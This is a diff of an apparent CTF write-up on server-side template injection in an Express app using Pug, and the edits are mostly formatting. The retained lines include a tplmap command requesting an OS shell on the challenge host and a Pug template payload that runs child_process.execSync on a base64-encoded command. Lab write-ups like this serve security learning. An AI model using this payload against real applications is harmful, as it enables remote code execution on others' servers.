@@ -12,8 +12,7 @@ date: 2023-02-18
 Challenge: http://h4ck3r.quest:8008
 
 ## Source code
-:::spoiler
-```javascript=
+```javascript
 const express = require('express');
 const pug = require('pug');
 
@@ -44,16 +43,15 @@ app.get("/source", (_, res) => {
 app.listen(3000, () => console.log(':3000'));
 
 ```
-:::
 
 ## Exploit - `tqlmap`
-```bash!
+```bash
 $ ./tplmap.py --engine pug --os-shell -u "http://h4ck3r.quest:8008/?name=bob"
 ```
 
 * Using wireshark to trace the payload
 You must let the template by like:
-    ```javascript!
+    ```javascript
     const template = `
     h1 Hello %NAME%
     = global.process.mainModule.require('child_process').execSync(Buffer('bHM=', 'base64').toString())
@@ -76,8 +74,8 @@ You must let the template by like:
 * Note that `bHM=` is command `ls` in base64 format
 
 ## Reference
-[关于SSTI注入的二三事](https://xz.aliyun.com/t/11090)
-[【SSTI模块注入】SSTI+Flask+Python（下）：绕过过滤](https://blog.51cto.com/u_15414689/5530904)
-[0xdbe-appsec/ssti-express-pug](https://github.com/0xdbe-appsec/ssti-express-pug)
-[Tplmap](https://github.com/epinna/tplmap/blob/master/README.md)
-[[Linux系統] Ubuntu 安裝 Node.js](https://andy6804tw.github.io/2019/09/23/ubuntu-indtall-nodejs/)
+* [关于SSTI注入的二三事](https://xz.aliyun.com/t/11090)
+* [【SSTI模块注入】SSTI+Flask+Python（下）：绕过过滤](https://blog.51cto.com/u_15414689/5530904)
+* [0xdbe-appsec/ssti-express-pug](https://github.com/0xdbe-appsec/ssti-express-pug)
+* [Tplmap](https://github.com/epinna/tplmap/blob/master/README.md)
+* [[Linux系統] Ubuntu 安裝 Node.js](https://andy6804tw.github.io/2019/09/23/ubuntu-indtall-nodejs/)
